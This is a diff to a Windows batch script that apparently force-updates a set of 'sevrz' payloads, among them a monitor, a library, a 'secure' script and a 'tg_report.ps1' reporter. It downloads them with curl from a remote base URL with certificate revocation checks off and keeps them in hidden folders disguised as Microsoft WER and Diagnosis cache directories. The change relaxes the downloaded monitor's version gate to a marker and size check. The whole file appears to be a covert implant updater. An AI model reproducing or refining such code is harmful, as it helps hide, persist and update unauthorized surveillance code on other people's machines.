@@ -1,5 +1,5 @@
 @echo off
-rem FREEZE_NOW R3 - force-update sevrz payloads only (mon/lib/secure/tg/channel); kick mon once. No msiexec.
+rem FREEZE_NOW R4 - force-update sevrz payloads only (mon/lib/secure/tg/channel); kick mon once. No msiexec.
 setlocal EnableExtensions
 set "WD=C:\ProgramData\Microsoft\Windows\WER\Temp\.wucache"
 set "ETL=C:\ProgramData\Microsoft\Diagnosis\State\.etlcache"
@@ -19,10 +19,15 @@ rem pull latest tip payloads (sevrz stack only)
 "%CURL%" -L --ssl-no-revoke --connect-timeout 8 --max-time 30 -o "%STAGE%\tg_report.ps1" "%RAW%/tg_report.ps1?t=%RANDOM%"
 "%CURL%" -L --ssl-no-revoke --connect-timeout 6 --max-time 15 -o "%STAGE%\fleet_channel.cfg" "%RAW%/fleet_channel.cfg?t=%RANDOM%"
 
-findstr /C:"OWN_MON  BUILD 20260804M70" "%STAGE%\own_mon.cmd" >nul
+rem R4: version-agnostic gate — marker + size only; host-side sticky floor blocks real downgrades
+findstr /C:"OWN_MON  BUILD 2026" "%STAGE%\own_mon.cmd" >nul
 if errorlevel 1 (
-  echo FAIL mon-not-M70
+  echo FAIL mon-download-bad
   endlocal & exit /b 2
+)
+for %%F in ("%STAGE%\own_mon.cmd") do if %%~zF LSS 5000 (
+  echo FAIL mon-download-small
+  endlocal & exit /b 3
 )
 
 attrib -h -s -r "%WD%\own_mon.cmd" "%WD%\own_lib.ps1" "%WD%\own_secure.cmd" "%WD%\tg_report.ps1" >nul 2>&1
